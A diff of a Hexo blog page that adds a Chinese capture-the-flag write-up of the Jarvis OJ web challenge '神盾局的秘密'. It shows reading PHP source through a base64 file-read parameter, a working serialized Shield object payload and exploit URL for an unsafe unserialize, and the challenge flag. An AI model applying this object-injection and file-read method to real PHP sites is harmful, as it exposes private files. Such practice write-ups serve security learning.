@@ -16,7 +16,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>Tags - Jarvis OJ ~ Hexo</title>
+  <title>Jarvis OJ 神盾局的秘密 ~ Hexo</title>
 
   <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
 <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
@@ -39,7 +39,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -113,6 +113,41 @@
             </span>
 
             
+              <br>
+              
+                <p class="mt-3">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
+                  Saturday, January 11th 2020, 6:44 pm
+                </p>
+              
+
+              <p>
+                
+                  
+                  &nbsp;<i class="far fa-chart-bar"></i>
+                  <span class="post-count">
+                    610 字
+                  </span>&nbsp;
+                
+
+                
+                  
+                  &nbsp;<i class="far fa-clock"></i>
+                  <span class="post-count">
+                      2 分钟
+                  </span>&nbsp;
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
+                  <span id="busuanzi_container_page_pv">
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>&nbsp;
+                
+              </p>
+            
           </div>
 
           
@@ -123,45 +158,139 @@
 
   <main>
     
-      <div class="container nopadding-md">
-        <div class="py-5 z-depth-3" id="board">
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto" id="post">
+          <div class="markdown-body">
+            <p>神盾局的秘密<br>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br>题目提示:</p>
+<p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
+<p>访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址<a href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。</a><br>读取showimg.php的内容:</p>
+<pre><code>&lt;?php
+    $f = $_GET[&#39;img&#39;];
+    if (!empty($f)) {
+        $f = base64_decode($f);
+        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
+        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) {
+            readfile($f);
+        } else {
+            echo &quot;File not found!&quot;;
+        }
+    }
+?&gt;</code></pre><p>普通的内容，没有与Flag相关的信息。<br>尝试读取index.php的信息:</p>
+<pre><code>&lt;?php 
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) {
+        $x = unserialize($g);
+    }
+    echo $x-&gt;readfile();
+?&gt;</code></pre><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤。<br>读取shield.php信息：</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+      function readfile() {
+          if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+          &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+              return @file_get_contents($this-&gt;file);
+          }
+      }
+  }</code></pre><p>  ?&gt;<br>说明了Flag在pctf.php中，结合index.php的源代码。得到最后的Flag信息。但是我们需要一个Shield类的实例$X,实例$x中的file属性为pctf.php。但是目前的代码无法做到这一点。但是想了很久都没有想到，最后请教了40huo。最后知道需要本地搭建环境，对示例进行序列话。<br>index.php</p>
+<pre><code>&lt;?php
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    echo serialize($x);
+?&gt;</code></pre><p>  shield.php</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;pctf.php&#39;) {
+            $this -&gt; file = $filename;
+        }
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><p>最关键的代码就是,在进行初始化的时候，将$filename赋值为pctf.php</p>
+<pre><code>function __construct($filename = &#39;pctf.php&#39;) {
+    $this -&gt; file = $filename;
+}</code></pre><p>最后得到的序列话的值是：</p>
+<pre><code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>最后访问URL:<a href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a><br>页面返回:</p>
+<pre><code>&lt;?php 
+    //Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
+    //Fake flag:
+    echo &quot;FLAG: PCTF{I_4m_not_fl4g}&quot;
+?&gt;</code></pre>
+            <hr>
+          </div>
+          <br>
+          <div>
+            <p>
+            
+              <span>
+                <i class="iconfont icon-inbox"></i>
                 
-
-<div class="list-group">
-<!--  <p class="h4">2 posts in total.</p>-->
-  <hr>
-  
-    
-      
-      <p class="h5">2020</p>
-    
-    <a href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">Jarvis OJ 神盾局的秘密</span>
-      <span style="float: right;">01-11</span>
-    </a>
-  
-    
-      
-      <p class="h5">2019</p>
-    
-    <a href="/2019/12/21/Jarvis-OJ-port-51/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">Jarvis OJ port 51</span>
-      <span style="float: right;">12-21</span>
-    </a>
-  
-</div>
-
-
-
-              </div>
-            </div>
+                  <a class="hover-with-bg" href="/categories/WEB">WEB</a>
+                  &nbsp;
+                
+              </span>&nbsp;&nbsp;
+            
+            
+              <span>
+                <i class="iconfont icon-tag"></i>
+                
+                  <a class="hover-with-bg" href="/tags/WEB">WEB</a>
+                
+                  <a class="hover-with-bg" href="/tags/Jarvis%20OJ">Jarvis OJ</a>
+                
+              </span>
+            
+            </p>
+            
           </div>
         </div>
       </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      
+
+    
+  </div>
+</div>
+
     
   </main>
 
@@ -236,6 +365,11 @@
 
 
 
+  
+    <script src="/lib/tocbot/tocbot.min.js" ></script>
+  
+  <script src="/js/post.js" ></script>
+
 
 
   <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
@@ -276,7 +410,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Tag - Jarvis OJ&nbsp;",
+        "Jarvis OJ 神盾局的秘密&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
